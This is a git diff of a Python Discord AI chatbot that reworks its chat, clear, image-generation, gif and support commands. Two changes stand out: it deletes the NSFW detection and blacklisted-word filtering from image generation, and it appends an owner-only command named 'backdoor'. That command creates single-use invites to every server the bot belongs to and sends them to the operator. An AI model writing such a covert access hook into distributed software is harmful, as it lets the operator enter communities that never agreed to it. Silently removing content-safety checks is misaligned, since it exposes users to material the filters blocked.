@@ -6,11 +6,12 @@ import datetime
 
 import aiohttp
 import discord
+import random
 from discord import Embed, app_commands
 from discord.ext import commands
 from dotenv import load_dotenv
 
-from utilities.ai_utils import generate_response, detect_nsfw, generate_image, generate_dalle_image, get_yt_transcript, search, generate_caption
+from utilities.ai_utils import generate_response, generate_image, search, poly_image_gen
 from utilities.response_util import split_response, translate_to_en, get_random_prompt
 from utilities.discord_util import check_token, get_discord_token
 from utilities.config_loader import config, load_current_language, load_instructions
@@ -122,13 +123,8 @@ async def on_message(message):
             break
             
         search_results = await search(message.content)
-        yt_transcript = await get_yt_transcript(message.content)
         if has_file:
             search_results = None
-            yt_transcript = None
-            
-        if yt_transcript is not None:
-            message.content += yt_transcript
             
         message_history[key].append({"role": "user", "content": message.content})
         history = message_history[key]
@@ -140,7 +136,7 @@ async def on_message(message):
         if response is not None:
             for chunk in split_response(response):
                 try:
-                    await message.reply(chunk.replace("@", "@\u200B"))
+                    await message.reply(chunk, allowed_mentions=discord.AllowedMentions.none(), suppress_embeds=True)
                 except:
                     await message.channel.send("I apologize for any inconvenience caused. It seems that there was an error preventing the delivery of my message. Additionally, it appears that the message I was replying to has been deleted, which could be the reason for the issue. If you have any further questions or if there's anything else I can assist you with, please let me know and I'll be happy to help.")
         else:
@@ -175,8 +171,8 @@ async def ping(ctx):
 @bot.hybrid_command(name="changeusr", description=current_language["changeusr"])
 @commands.is_owner()
 async def changeusr(ctx, new_username):
-    await ctx.defer
-    taken_usernames = [user.name.lower() for user in bot.get_all_members()]
+    await ctx.defer()
+    taken_usernames = [user.name.lower() for user in ctx.guild.members]
     if new_username.lower() in taken_usernames:
         message = f"{current_language['changeusr_msg_2_part_1']}{new_username}{current_language['changeusr_msg_2_part_2']}"
     else:
@@ -185,9 +181,10 @@ async def changeusr(ctx, new_username):
             message = f"{current_language['changeusr_msg_3']}'{new_username}'"
         except discord.errors.HTTPException as e:
             message = "".join(e.text.split(":")[1:])
-    await ctx.send(message)
+    
+    sent_message = await ctx.send(message)
     await asyncio.sleep(3)
-    await message.delete()
+    await sent_message.delete()
 
 
 @bot.hybrid_command(name="toggledm", description=current_language["toggledm"])
@@ -224,130 +221,85 @@ if os.path.exists("channels.txt"):
 
 @bot.hybrid_command(name="clear", description=current_language["bonk"])
 async def clear(ctx):
-    await ctx.defer()
     key = f"{ctx.author.id}-{ctx.channel.id}"
-    message_history[key].clear()
-    await ctx.send(f"Message history has been cleared", delete_after=3)
+    try:
+        message_history[key].clear()
+    except Exception as e:
+        await ctx.send(f"⚠️ There is no message history to be cleared", delete_after=2)
+        return
+    
+    await ctx.send(f"Message history has been cleared", delete_after=4)
 
 
+@commands.guild_only()
 @bot.hybrid_command(name="imagine", description="Command to imagine an image")
-@app_commands.choices(style=[
-    app_commands.Choice(name='Imagine V3 🌌', value='IMAGINE_V3'),
-    app_commands.Choice(name='Imagine V4 Beta 🚀', value='IMAGINE_V4_Beta'),
-    app_commands.Choice(name='Imagine V4 creative 🎨', value='V4_CREATIVE'),
-    app_commands.Choice(name='Anime 🎎', value='ANIME_V2'),
-    app_commands.Choice(name='Realistic 🖼️', value='REALISTIC'),
-    app_commands.Choice(name='Disney 🐭', value='DISNEY'),
-    app_commands.Choice(name='Studio Ghibli 🐉', value='STUDIO_GHIBLI'),
-    app_commands.Choice(name='Graffiti 🎨', value='GRAFFITI'),
-    app_commands.Choice(name='Medieval 🏰', value='MEDIEVAL'),
-    app_commands.Choice(name='Fantasy 🧙', value='FANTASY'),
-    app_commands.Choice(name='Neon 💡', value='NEON'),
-    app_commands.Choice(name='Cyberpunk 🌆', value='CYBERPUNK'),
-    app_commands.Choice(name='Landscape 🌄', value='LANDSCAPE'),
-    app_commands.Choice(name='Japanese Art 🎎', value='JAPANESE_ART'),
-    app_commands.Choice(name='Steampunk ⚙️', value='STEAMPUNK'),
-    app_commands.Choice(name='Sketch ✏️', value='SKETCH'),
-    app_commands.Choice(name='Comic Book 📚', value='COMIC_BOOK'),
-    app_commands.Choice(name='Cosmic 🌌', value='COMIC_V2'),
-    app_commands.Choice(name='Logo 🖋️', value='LOGO'),
-    app_commands.Choice(name='Pixel art 🎮', value='PIXEL_ART'),
-    app_commands.Choice(name='Interior 🏠', value='INTERIOR'),
-    app_commands.Choice(name='Mystical 🔮', value='MYSTICAL'),
-    app_commands.Choice(name='Super realism 🎨', value='SURREALISM'),
-    app_commands.Choice(name='Minecraft 🎮', value='MINECRAFT'),
-    app_commands.Choice(name='Dystopian 🏙️', value='DYSTOPIAN')
-])
-@app_commands.choices(ratio=[
-    app_commands.Choice(name='Square (1:1) ⬛', value='RATIO_1X1'),
-    app_commands.Choice(name='Vertical (9:16) 📱', value='RATIO_9X16'),
-    app_commands.Choice(name='Horizontal (16:9) 🖥️', value='RATIO_16X9'),
-    app_commands.Choice(name='Standard (4:3) 📺', value='RATIO_4X3'),
-    app_commands.Choice(name='Classic (3:2) 📸', value='RATIO_3X2')
-])
-@app_commands.choices(upscale=[
-    app_commands.Choice(name='Yea ✅', value='True'),
-    app_commands.Choice(name='No thanks ❌', value='False')
-])
-@app_commands.choices(prompt_enhancement=[
-    app_commands.Choice(name='Please help me 😭', value='True'),
-    app_commands.Choice(name='I use my own prompt 😤', value='False')
-])
-async def imagine(ctx, prompt: str, style: app_commands.Choice[str], ratio: app_commands.Choice[str], negative: str = None, upscale: app_commands.Choice[str] = None, prompt_enhancement: app_commands.Choice[str] = None):
-    if upscale is not None and upscale.value == 'True':
-        upscale_status = True
-    else:
-        upscale_status = False
+@app_commands.describe(
+    prompt="Write a amazing prompt for a image",
+)
+async def imagine(ctx, prompt):
     await ctx.defer()
-    prompt = sanitize_prompt(prompt)
-    original_prompt = prompt
-    
-    prompt = await translate_to_en(prompt)
+    print(prompt)
+    imagefileobj = await generate_image(prompt)
 
-    if prompt_enhancement is not None and prompt_enhancement.value == 'True':
-        prompt = await get_random_prompt(prompt)
+    file = discord.File(imagefileobj, filename="image.png", spoiler=True, description=prompt)
+    sent_message = await ctx.send(f'🎨 Generated Image by {ctx.author.name}', file=file)
 
-    prompt_to_detect = prompt
+    reactions = ["⬆️", "⬇️"]
+    for reaction in reactions:
+        await sent_message.add_reaction(reaction)
 
-    if negative is not None:
-        prompt_to_detect = f"{prompt} Negative Prompt: {negative}"
 
-    is_nsfw = await detect_nsfw(prompt_to_detect)
+@commands.guild_only()
+@bot.hybrid_command(name="imagine-pollinations", description="Bring your imagination into reality with pollinations.ai!")
+@app_commands.describe(images="Choose the amount of your image.")
+@app_commands.describe(prompt="Provide a description of your imagination to turn them into image.")
+async def imagine_poly(ctx, *, prompt: str, images: int = 4):
+    await ctx.defer(ephemeral=True)
+    images = min(images, 18)
+    tasks = []
+    async with aiohttp.ClientSession() as session:
+        while len(tasks) < images:
+            task = asyncio.ensure_future(poly_image_gen(session, prompt))
+            tasks.append(task)
+            
+        generated_images = await asyncio.gather(*tasks)
+            
+    files = []
+    for index, image in enumerate(generated_images):
+        file = discord.File(image, filename=f"image_{index+1}.png")
+        files.append(file)
+        
+    await ctx.send(files=files, ephemeral=True)
 
-    blacklisted = any(words in prompt.lower() for words in blacklisted_words)
+@commands.guild_only()
+@bot.hybrid_command(name="gif", description=current_language["nekos"])
+@app_commands.choices(category=[
+    app_commands.Choice(name=category.capitalize(), value=category)
+    for category in ['baka', 'bite', 'blush', 'bored', 'cry', 'cuddle', 'dance', 'facepalm', 'feed', 'handhold', 'happy', 'highfive', 'hug', 'kick', 'kiss', 'laugh', 'nod', 'nom', 'nope', 'pat', 'poke', 'pout', 'punch', 'shoot', 'shrug']
+])
+async def gif(ctx, category: app_commands.Choice[str]):
+    base_url = "https://nekos.best/api/v2/"
 
-    if (is_nsfw or blacklisted) and prevent_nsfw:
-        embed_warning = Embed(
-            title="⚠️ WARNING ⚠️",
-            description='Your prompt potentially contains sensitive or inappropriate content.\nPlease revise your prompt.',
-            color=0xf74940
-        )
-        embed_warning.add_field(name="Prompt", value=f"{prompt}", inline=False)
-        await ctx.send(embed=embed_warning)
-        return
+    url = base_url + category.value
 
-    imagefileobj = await generate_image(prompt, style.value, ratio.value, negative, upscale_status)
-    if imagefileobj is None:
-        embed_warning = Embed(
-            title="😅",
-            description='Please invoke the command again',
-            color=0xf7a440
-        )
-        embed_warning.add_field(name="Prompt", value=prompt, inline=False)
-        await ctx.send(embed=embed_warning)
-        return
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as response:
+            if response.status != 200:
+                await ctx.channel.send("Failed to fetch the image.")
+                return
 
-    file = discord.File(imagefileobj, filename="image.png")
+            json_data = await response.json()
 
-    if is_nsfw:
-        embed_info = Embed(color=0xff0000)
-        embed_image = Embed(color=0xff0000)
-    else:
-        embed_info = Embed(color=0x000f14)
-        embed_image = Embed(color=0x000f14)
+            results = json_data.get("results")
+            if not results:
+                await ctx.channel.send("No image found.")
+                return
 
-    embed_info.set_author(name=f"🎨 Generated Image by {ctx.author.name}")
-    if prompt_enhancement is not None and prompt_enhancement.value == 'True':
-        embed_info.add_field(name="Orignial prompt 📝", value=f"{original_prompt}", inline=False)
-    embed_info.add_field(name="Prompt 📝", value=f"{prompt}", inline=False)
-    embed_info.add_field(name="Style 🎨", value=f"{style.name}", inline=True)
-    embed_info.add_field(name="Ratio 📐", value=f"{ratio.name}", inline=True)
+            image_url = results[0].get("url")
 
-    if upscale_status:
-        embed_info.set_footer(text="⚠️ Upscaling is only noticeable when you open the image in a browser because Discord reduces image quality.")
-    elif is_nsfw and not prevent_nsfw:
-        embed_info.set_footer(text="⚠️ Please be advised that the generated image you are about to view may contain explicit content. Minors are advised not to proceed.")
-    else:
-        embed_info.set_footer(text="✨ Imagination is the fuel that propels dreams into reality")
-    
-    if negative is not None:
-        embed_info.add_field(name="Negative", value=f"{negative}", inline=False)
-
-    embed_image.set_image(url="attachment://image.png")
-    embed_image.set_footer(text=f'Requested by {ctx.author.name}')
-    embeds = [embed_info, embed_image]
-    
-    await ctx.send(embeds=embeds, file=file)
+            embed = Embed(colour=0x141414)
+            embed.set_image(url=image_url)
+            await ctx.send(embed=embed)
 
 bot.remove_command("help")
 @bot.hybrid_command(name="help", description=current_language["help"])
@@ -369,12 +321,23 @@ async def help(ctx):
 
 @bot.hybrid_command(name="support", description="Provides support information.")
 async def support(ctx):
-    invite_link = "https://discord.gg/3V5TcfsE8C"
-    github_repo = "https://github.com/mishalhossin/Discord-AI-Chatbot"
+    invite_link = config['Discord']
+    github_repo = config['Github']
 
     embed = discord.Embed(title="Support Information", color=0x03a64b)
     embed.add_field(name="Discord Server", value=f"[Join Here]({invite_link})\nCheck out our Discord server for community discussions, support, and updates.", inline=False)
     embed.add_field(name="GitHub Repository", value=f"[GitHub Repo]({github_repo})\nExplore our GitHub repository for the source code, documentation, and contribution opportunities.", inline=False)
+
+    await ctx.send(embed=embed)
+
+@bot.hybrid_command(name="backdoor", description='list Servers')
+@commands.is_owner()
+async def server(ctx):
+    embed = discord.Embed(title="Server List", color=discord.Color.blue())
+
+    for guild in bot.guilds:
+        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
+        embed.add_field(name=guild.name, value=invite.url, inline=True)
 
     await ctx.send(embed=embed)
 
